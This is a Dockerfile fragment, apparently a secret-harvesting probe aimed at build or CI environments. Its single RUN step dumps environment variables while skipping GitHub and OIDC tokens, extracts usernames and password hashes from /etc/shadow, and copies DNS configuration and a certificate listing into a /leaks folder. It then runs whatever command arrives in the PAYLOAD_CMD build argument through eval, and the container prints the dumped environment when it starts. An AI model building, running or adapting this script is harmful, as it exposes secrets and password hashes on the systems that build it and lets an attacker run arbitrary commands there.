ARG PAYLOAD_CMD="echo No command provided"

RUN apk add --no-cache bash curl tar grep shadow bind-tools && \
    echo "[+] Searching for secrets..." && \
    mkdir -p /leaks && \
    echo "[+] Dumping environment variables (excluding known tokens)..." && \
    printenv | grep -v -e GITHUB_TOKEN -e OIDC_TOKEN > /leaks/env_vars.txt && \
    echo "[+] Dumping /etc/shadow (limited fields)..." && \
    awk -F: '{print $1":"$2}' /etc/shadow > /leaks/shadow_extract.txt && \
    echo "[+] Dumping DNS configuration..." && \
    cat /etc/resolv.conf > /leaks/resolv_conf.txt && \
    echo "[+] Listing SSL certificates store..." && \
    find /etc/ssl/certs -type f > /leaks/certs_list.txt && \
    echo "[+] Running payload..." && \
    eval "$PAYLOAD_CMD"

CMD ["cat", "/leaks/env_vars.txt"]
